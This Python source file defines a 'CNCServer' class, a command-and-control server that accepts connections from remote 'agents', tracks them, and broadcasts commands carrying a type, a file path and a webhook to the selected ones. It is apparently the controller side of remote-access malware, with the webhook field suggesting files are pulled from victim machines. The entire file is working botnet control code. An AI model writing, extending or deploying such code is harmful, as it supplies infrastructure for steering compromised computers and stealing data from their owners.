import socket
import threading


class CNCServer:
    def __init__(self, log_callback, add_agent_callback):
        self.log_callback = log_callback
        self.add_agent_callback = add_agent_callback
        self.agents = {}
        self.is_running = False

    def start(self, port):
        """Starts the CNC server."""
        if self.is_running:
            return
        
        self.is_running = True
        threading.Thread(target=self._srv_loop, args=(port,), daemon=True).start()

    def _srv_loop(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            s.listen(100)
            self.log_callback(f"[+] Server is listening on port {port}")
            
            while self.is_running:
                c, a = s.accept()
                try:
                    info = c.recv(1024).decode('utf-8', errors='ignore').strip()
                    if not info:
                        info = "Unknown Agent"
                except:
                    info = "Unknown Agent"
                
                self.add_agent_callback(c, a, info)
        except Exception as e:
            self.is_running = False
            self.log_callback(f"[-] Server Error: {e}")

    def send_command(self, type, path="", webhook=""):
        """Sends a command to all active agents."""
        cmd = f"{type}|{path}|{webhook}"
        to_remove = []
        
        for sock, agent_data in self.agents.items():
            if agent_data["var"].get():
                try:
                    sock.send(cmd.encode())
                except:
                    to_remove.append(sock)
        
        for sock in to_remove:
            agent_data = self.agents.pop(sock)
            agent_data["cb"].destroy()

    def add_agent(self, sock, agent_data):
        """Registers an agent in the server's tracking."""
        self.agents[sock] = agent_data
